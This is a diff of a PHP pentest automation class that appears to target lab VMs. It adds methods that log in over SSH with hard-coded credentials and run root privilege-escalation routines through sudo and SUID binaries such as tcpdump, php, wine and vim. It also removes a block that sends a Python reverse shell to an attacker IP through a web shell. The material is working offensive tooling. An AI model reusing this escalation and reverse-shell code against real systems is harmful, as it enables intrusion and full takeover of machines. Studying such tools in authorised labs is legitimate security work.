@@ -79,17 +79,19 @@ class poc4lan extends poc4web {
         $vm = trim($vm);
         $this->titre(__FUNCTION__);
         
+        
         //$victime = new vm($vm);
         //$victime->vm2upload("$this->dir_tools/Malware/ISHELL-v0.2.tar.gz","$this->vm_tmp_lin/ISHELL-v0.2.tar.gz");
         
         $flag_poc = FALSE;
-        //$flag_poc = TRUE;
+        //$flag_poc = "no";
         
         $test = new SERVICE4COM($eth,$domain,$ip, $port, $protocol);
         $test->poc($flag_poc);
+        var_dump($test->flag_poc);
         $stream = $test->stream8ssh8passwd($test->ip, $test->port, $login,$pass);
         
-        $template_cmd = "sshpass -p '$pass' ssh -o ConnectTimeout=15 -o StrictHostKeyChecking=no  -o UserKnownHostsFile=/dev/null  $login@$test->ip -p $test->port -C  '%CMD%'";
+        $template_cmd = "sshpass -p '$pass' ssh -o ConnectTimeout=15 -o StrictHostKeyChecking=no  -o UserKnownHostsFile=/dev/null  $login@$test->ip -p $test->port -C  '%CMD%' ";
         list($stream,$template_id,$template_cmd,$template_shell) = $test->stream4check($stream,$template_cmd,$login,$pass);
         
         if (is_resource($stream)){
@@ -99,22 +101,42 @@ class poc4lan extends poc4web {
             
             $data = "id";
             $rst_id = $test->stream4result($stream, $data, 10);
-            list($uid,$uid_name,$gid,$gid_name,$euid,$username_euid,$egid,$groupname_egid,$groups,$context) = $test->parse4id($rst_id);
-            $id8b64 = base64_encode($id);
+            list($uid,$uid_name,$gid,$gid_name,$euid,$username_euid,$egid,$groupname_egid,$groups,$context,$id8str) = $test->parse4id($rst_id);
+            $id8b64 = base64_encode($id8str);
             $this->article("CREATE Template ID", $template_id);
             $this->article("CREATE Template CMD", $template_cmd);
             $this->article("CREATE Template SHELL", $template_shell);
-            $this->pause();
+            $test->pause();
+            $query = "DELETE FROM LAN where id8port = '$test->port2id' ";
+            $test->mysql_ressource->query($query);
+                
             $obj_lan = new check4linux8users($test->eth,$test->domain,$test->ip, $test->port, $test->protocol,$stream, $templateB64_id,$templateB64_cmd,$templateB64_shell,$id8b64,$pass);
             $obj_lan->poc($test->flag_poc);
-            
-            return $obj_lan->$fonction2exec();
+            var_dump($obj_lan->flag_poc);
+            $obj_lan->$fonction2exec();
+            $obj_lan->lan2brief();
         }
     }
     
+    public function poc4root8suid2elf(){ // OK
+        $this->ssTitre(__FUNCTION__);
+        $eth = 'vmnet6';
+        $domain = 'hack.vlan';
+        
+        $ip = "10.60.10.178"; // Five 1
+        $port = "22";
+        $protocol = "T";
+        $login = "moss" ;
+        $pass = 'Fire!Fire!';
+        
+        $titre = "";
+        $fonction2exec = "lan4root";
+        $vm = "";
+        $this->poc4root($eth,$domain,$ip,$port,$protocol,$login,$pass,$titre,$fonction2exec,$vm);
+        
+    }
     
-    
-    public function poc4root8suid8app2find(){
+    public function poc4root8suid2find(){
         $this->ssTitre(__FUNCTION__);
         $eth = 'vmnet6';
         $domain = 'hack.vlan';
@@ -212,6 +234,23 @@ class poc4lan extends poc4web {
         
     }
     
+    public function poc4root8users2sudoers8app2cmd2tcpdump(){ // OK
+        $this->ssTitre(__FUNCTION__);
+        $eth = 'vmnet6';
+        $domain = 'hack.vlan';
+        
+        $ip = "10.60.10.169"; //webdeveloper
+        $port = "22";
+        $protocol = "T";
+        $login = "webdeveloper" ;
+        $pass = 'MasterOfTheUniverse';
+        
+        $titre = "";
+        $fonction2exec = "users";
+        $vm = "";
+        $this->poc4root($eth,$domain,$ip,$port,$protocol,$login,$pass,$titre,$fonction2exec,$vm);
+        
+    }
     
     public function poc4root8users2sudoers8app2cmd2strace(){ // OK
         $this->ssTitre(__FUNCTION__);
@@ -257,6 +296,63 @@ class poc4lan extends poc4web {
         $this->poc4root($eth,$domain,$ip,$port,$protocol,$login,$pass,$titre,$fonction2exec,$vm);
         
     }
+ 
+
+
+    public function poc4root8users2sudoers8app2cmd2ftp(){ // 
+        $this->ssTitre(__FUNCTION__);
+        $eth = 'vmnet6';
+        $domain = 'hack.vlan';
+        
+        $ip = "10.60.10.172"; // HA-InfinityStones
+        $port = "22";
+        $protocol = "T";
+        $login = "morag" ;
+        $pass = "yondu";
+        
+        $titre = "";
+        $fonction2exec = "users";
+        $vm = "";
+        $this->poc4root($eth,$domain,$ip,$port,$protocol,$login,$pass,$titre,$fonction2exec,$vm);
+        
+    }
+    
+    public function poc4root8users2sudoers8app2cmd2wine(){ // revoir
+        $this->ssTitre(__FUNCTION__);
+        $eth = 'vmnet6';
+        $domain = 'hack.vlan';
+        
+        $ip = "10.60.10.170"; // Sunrise
+        $port = "22";
+        $protocol = "T";
+        $login = "sunrise" ;
+        $pass = 'thefutureissobrightigottawearshades';
+        
+        $titre = "";
+        $fonction2exec = "users";
+        $vm = "";
+        $this->poc4root($eth,$domain,$ip,$port,$protocol,$login,$pass,$titre,$fonction2exec,$vm);
+        
+    }
+    
+    public function poc4root8users2sudoers8app2cmd2php(){ // OK
+        $this->ssTitre(__FUNCTION__);
+        $eth = 'vmnet6';
+        $domain = 'hack.vlan';
+        
+        $ip = "10.60.10.168"; // me and my girlfriend
+        $port = "22";
+        $protocol = "T";
+        $login = "alice" ;
+        $pass = '4lic3';
+        
+        $titre = "";
+        $fonction2exec = "users";
+        $vm = "";
+        $this->poc4root($eth,$domain,$ip,$port,$protocol,$login,$pass,$titre,$fonction2exec,$vm);
+        
+    }
+    
     
     public function poc4root8users2sudoers8app2cmd2ed(){ // OK 
         $this->ssTitre(__FUNCTION__);
@@ -324,7 +420,7 @@ class poc4lan extends poc4web {
         
     }
     
-    public function poc4root8suid8app2vim(){
+    public function poc4root8suid2vim(){
         $this->ssTitre(__FUNCTION__);
         $eth = 'vmnet6';
         $domain = 'hack.vlan';
@@ -372,7 +468,7 @@ class poc4lan extends poc4web {
     
     
     
-    public function poc4root8suid8app2write2etc_sudoers(){
+    public function poc4root8suid2write2etc_sudoers(){
         $this->ssTitre(__FUNCTION__);
         $eth = 'vmnet6';
         $domain = 'hack.vlan';
@@ -512,7 +608,7 @@ e5ofsDLuIOhCVzsw/DIUrF+4liQ3R36Bu2R5+kmPFIkkeW1tYWIY7CpfoJSd74VC
     
     
     
-    public function poc4root8suid8app2lib(){
+    public function poc4root8suid2lib(){
         $this->ssTitre(__FUNCTION__);
         $eth = 'vmnet6';
         $domain = 'hack.vlan';
@@ -888,6 +984,7 @@ e5ofsDLuIOhCVzsw/DIUrF+4liQ3R36Bu2R5+kmPFIkkeW1tYWIY7CpfoJSd74VC
     }
     
     
+    
     public function poc4root8users2sudoers2app2read8teehee(){
         $this->ssTitre(__FUNCTION__);
         $eth = 'vmnet6';
@@ -992,27 +1089,7 @@ e5ofsDLuIOhCVzsw/DIUrF+4liQ3R36Bu2R5+kmPFIkkeW1tYWIY7CpfoJSd74VC
         $fonction2exec = "";
         $vm = "";
         $this->poc4root($eth,$domain,$ip,$port,$protocol,$login,$pass,$titre,$fonction2exec,$vm);
-        
-        
-        $flag_poc = FALSE;
-        $flag_poc = TRUE;
-        
-        $test = new SERVICE4COM($eth,$domain,$ip, $port, $protocol);
-        $test->poc($flag_poc);
-        $url_id = "http://$test->ip:80/shell.php?cmd=%ID%";
-        $url_cmd = "http://$test->ip:80/shell.php?cmd=%CMD%";
-        $attacker_ip = $this->ip4addr4target($test->ip);
-        $attacker_port = rand(1024,65535);
-        $attacker_port = 9999;
-        $shell = "/bin/bash";
-        $cmd_nc = $this->rev8python($attacker_ip, $attacker_port, $shell);
-        $cmd_nc_encode = $test->url2encode($cmd_nc);
-        $template_id = "wget --user-agent=\"$test->user2agent\" --tries=2 --no-check-certificate \"$url_id\" -qO-  ";
-        $template_shell = "wget --user-agent=\"$test->user2agent\" --tries=2 --no-check-certificate \"$url_cmd\" -qO-  ";
-        $template_cmd = str_replace("%SHELL%",$cmd_nc_encode,$template_shell);
-        $templateB64_cmd = base64_encode($template_cmd);
-        $templateB64_shell = base64_encode($template_shell);
-        $test->service4lan($template_cmd,$templateB64_shell,$attacker_port,"T");
+
         
     }
     
